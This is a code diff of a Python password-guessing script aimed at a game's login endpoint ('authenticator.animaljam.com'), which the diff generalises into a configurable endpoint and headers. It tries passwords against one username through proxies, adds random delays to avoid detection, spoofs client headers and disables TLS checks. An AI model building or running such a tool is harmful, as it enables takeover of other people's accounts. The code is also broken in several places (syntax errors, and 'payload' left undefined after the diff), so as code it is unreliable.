@@ -13,7 +13,8 @@ class LoginRequests:
     def __init__(self):
          args = parse_arguments()
          self.username = args.username
-         self.uri = "https://authenticator.animaljam.com/authenticate" 
+         self.uri = args.endpoint 
+         self.headers = args.headers
          self.threading = Threading()
          self.print_lock = self.threading.print_lock
          self.repeated_lock = self.threading.repeated_lock
@@ -22,61 +23,19 @@ class LoginRequests:
          
 
     def send_login(self, password, proxy = None) -> None:
-        df = uuid.uuid4() # random device fingerprint ( server does not care )
+        
         if not proxy:
             time.sleep(random.uniform(1.5, 4.7)) 
         else:
             time.sleep(random.uniform(1,3.5)) 
 
-        # content length bytes
-        body = json.dumps(payload, seperators=(",", ":")).encode("utf-8"
-        )
+      
 
-        content_length = len(body)
-
-        # rand cookies
-        cookie = f"GA1.2"
-
-        # user agent detection
-
-        def os_token() -> str :
-            system = platform.system()
-            if system == "Windows":
-                return "Windows NT 10.0; Win64; x64"
-            if system == "Darwin":
-                ver = platform.mac_ver()[0].replace(".", "_")
-            else:
-                ver = "14_5_0"
-                return f"Macintosh; Intel Mac OS X {ver}"
-            return "X11; Linux x86_64" #unlikely, but a fall back user agent
         
-        #recraft into the user-agent template
-        UA = (
-        f"Mozilla/5.0 ({os_token()}) AppleWebKit/537.36 (KHTML, like Gecko) 
-        AJClassic/1.5.7 Chrome/87.0.4280.141 Electron/11.5.0 Safari/537.36"
-        )
+
+     
         
-        # endpoint headers
-        headers = {
-        "content-length": content_length,
-        "user-agent": UA,
-        "content-type": "application/json"
-        "accept": "*/*"
-        "sec-fetch-site": "cross-site",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-dest": "empty",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US",
-        "cookie": "_ga=GA1.2.764210468.1765840055",
-        "cookie": "_ga_377QC1616V=GS2.2.s1771889586$o2$g0$t1771889586$j60$l0$h0" # google analytics cookie fields. Can stay static for all reqs.
-    }
-        # intercepted login endpoint payload
-        payload = { 
-        "username": self.username, 
-        "password": password, 
-        "domain": "flash", 
-        "df": str(df)
-        } 
+     
 
         
         max_retries = 3
@@ -85,7 +44,7 @@ class LoginRequests:
                 self.pause_event.wait(timeout=0.1)
             proxies = {"http": proxy, "https": proxy} if proxy else None
             try: # send requests 
-                response = requests.post(self.uri, json=payload, headers=headers, proxies=proxies, timeout=2.0, verify=False)
+                response = requests.post(self.uri, json=payload, headers=self.headers, proxies=proxies, timeout=2.0, verify=False)
                 with self.print_lock:
                     print(Fore.BLUE + f'Trying password: "{password}" response code: {response.status_code}')
 
